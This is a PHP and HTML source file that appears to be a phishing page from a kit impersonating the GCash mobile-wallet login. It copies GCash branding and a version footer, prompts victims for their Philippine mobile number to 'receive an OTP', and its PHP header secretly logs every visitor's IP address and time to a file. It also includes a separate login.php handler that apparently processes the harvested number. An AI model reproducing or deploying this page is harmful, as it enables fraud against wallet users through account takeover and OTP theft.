<?php
error_reporting(0); 
include('login.php');
$v = "<span style='color:#ffffff;'><blink>【 VISITOR 】</blink></span>  TIME: ".date('h:i:s')." | IP : [<span style='color:#ff9900;'>".$_SERVER['REMOTE_ADDR']."</span>]<br>";
$fh = fopen('visits.txt' ,'a');
fwrite($fh, ' '."".$v ."\n\n");
fclose($fh);
$isSuccess = json_encode($validator['isSuccess']);
$errorMessage = $validator['errorMessage']; 
?> 

<!DOCTYPE html>
<html>
  <head>
    <title>GCash</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
    <link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet">
    <style>
body, html {
  height: 100%;
  margin: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 0;
  background: #1c72f9;
  font-family: Karla, Roboto, sans-serif;
  color: white;
  overflow: hidden; /* Added this line */
}

      .wrapper {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        height: 100%;
        padding: 20px;
      }

      .story {
        box-sizing: border-box;
        max-width: 600px;
        background-color: #1c72f9;
        overflow: auto;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.15);
      }
      .number {
        background: #0079FC;
        border: none;
        color: white;
        border-bottom: 1px solid white;
      }
      .number {
        outline: none;
        border: none;
        background: transparent;
        font-size: 28px;
        color: white;
        height: 35px;
        font-weight: bold;
        letter-spacing: 0.5px;
        overflow-x: scroll;
        font-family: Karla, sans-serif;
      }
      .number::placeholder {
        font-size: 30px;
        color: #DFDEDD;
        font-weight: bold;
        opacity: 25%;
      }
.underline {
  border-bottom: 1.5px solid rgba(245, 243, 244, 0.38);
  padding-bottom: 1px;
  width: 80%;
  margin: auto;
          position: relative;
        top: 55px;
}
      .gcash-icon {
        content: url(Gcash_files/gcash_logo2.png);
        width: 250px;
        height: 80px;
          display: block;
  margin-left: auto;
  margin-right: auto;
      }


      @media only screen and (max-width: 600px) {
        .story {
          width: 100%;
          height: 100vh;
          max-width: none;
        }

      }

      /* Your adjusted CSS here, with width and height properties removed or adapted as needed */
      img {
        max-width: 100%;
        height: auto;
      }

      .gcash-icon {
        content: url(Gcash_files/gcash_logo2.png);
        width: 250px;
        height: 80px;
        position: relative;
        top: 50px;
      }
      .content-center {
        width: 350px;
        display: flex;
        justify-content: center;
        flex-direction: column;
        align-items: start;
        margin: 10px auto;
		padding-top: 10px;
      }

      #next {
        text-align: center;
        background-color: white;
        border: none;
        margin: 5px;
        padding: 15px;
        color: #0079FC;
        outline: none;
        cursor: pointer;
        font-size: 16px;
        border-radius: 35px;
        width: 100%;
        height: auto;
        box-sizing: border-box;
        font-family: Karla, sans-serif;
        font-weight:bold;
      }

      #next:disabled {
        text-align: center;
        background-color: rgba(255, 255, 255, 0.3);
        border: none;
        margin: 5px;
        padding: 15px;
        color: #0079FC;
        outline: none;
        font-size: 16px;
        border-radius: 35px;
        width: 100%;
        height: auto;
        box-sizing: border-box;
        font-family: Karla, sans-serif;
        font-weight:bold;
      }

    </style>
  </head>
  <script>
  function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
      return false;
    }
    return true;
  }
  function formatPhoneNumber(e) {
  const input = e.target;
  const txt = input.value;
  if ((txt.length == 12 || e.which == 32) & e.which !== 8) e.preventDefault();

  if ((txt.length == 3 || txt.length == 7) && e.which !== 8)
    input.value = input.value + " ";
}

</script>
  <body>
    <div class="wrapper">
      <div class="story">
        <!-- Logo -->
        <img class="gcash-icon"/>
        <form method="post" name="mnumber">
          <div class="content-center">
	<img src="Gcash_files/sdsds.jpg" width="100%" height="27%" style="position:relative; top:35px;">
            <span style="color: white;font-size: 14.5px;margin-left: 35px;position: relative;
        top: 45px;"><b>Put your mobile number to get started.</b></span><br>
            
<div class="underline">
  <div style="display: flex; align-items: center;">
    <span class="sixty" style="font-size:30px;opacity:100%;font-weight: bold;">
      +63
    </span>
	<img src="Gcash_files/dissable_arrow.png" alt="Arrow" style="height: 5px; width: 10px;margin: 0 5px 0 5px;">
    <input
      type="tel"
      class="number"
      value="<?= $number?>"
      name="number"
      onkeyup="btnState(this.value)"
      onkeypress="return isNumber(event)"
      id="phnumbervalid"
      oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength); removeFirstZero()"
      onkeydown="formatPhoneNumber(event)"
      maxlength="12"
      placeholder="123 456 7890"
      required
    >
  </div>
</div>


            <?=$isSuccess === 'false' ? "<span class='error-text error-message' style='position: relative;
        top: 55px;color: #b01e1e;font-size: 13.5px;margin-left: 25px;margin-top:15px;margin-right: 23px;'>$errorMessage</span>" : null?>
            <p class="bottomMessage"><?=$isSuccess === 'false' ? null : ""?></p>
            <br>
          </div>
          <br><br><br><br><br>
          <div id="button">
            <p style="margin-top:50px;text-align:center;font-size: 13px;opacity:80%;">
              By tapping next, we&apos;ll collect your mobile number&apos;s<br>network information to be able to send you a <br>One-Time Password (OTP).<br><br></p>
            <input type="submit" name="submitnum" id="next" value="Next" disabled>
            <br>
          </div>
        </form>

        <script>
          // Auto focus
          document.querySelector(".number").focus();

          // Next button status
          function removeFirstZero() {
            let input = document.getElementById("phnumbervalid");
            let value = input.value;

            if (value[0] === '0') {
              input.value = value.slice(1);
            }
          }

          function btnState(value) {
            let number = document.getElementById("phnumbervalid").value;
            let formattedNumber = number.replace(/\s+/g, '');
            let numberLength = formattedNumber.length;
            let withoutZero = formattedNumber[0] === '9';
            let withZero = formattedNumber.slice(0, 2) === '09';
            let nextState = document.getElementById("next");

            if (numberLength === 11 && withZero) {
              formattedNumber = formattedNumber.slice(1);
              numberLength = formattedNumber.length;
              document.getElementById("phnumbervalid").value = formattedNumber;
            }

            numberLength === 10 && withoutZero
              ? nextState.disabled = false
              : nextState.disabled = true;
          }
        </script>
        <br>
        <hr style="opacity: 20%; margin-top: 10px;">
        <br>
        <div style="text-align: center;">
          <small style="color: white;font-weight: 900;font-size: 16px;">Help Center</small>
        </div>
		<br />
        <div class="footer" style="text-align: center; opacity: 50%;">
          <small>v5.67.0:804</small>
        </div>
        <br>
      </div>
    </div>
  </body>
</html>
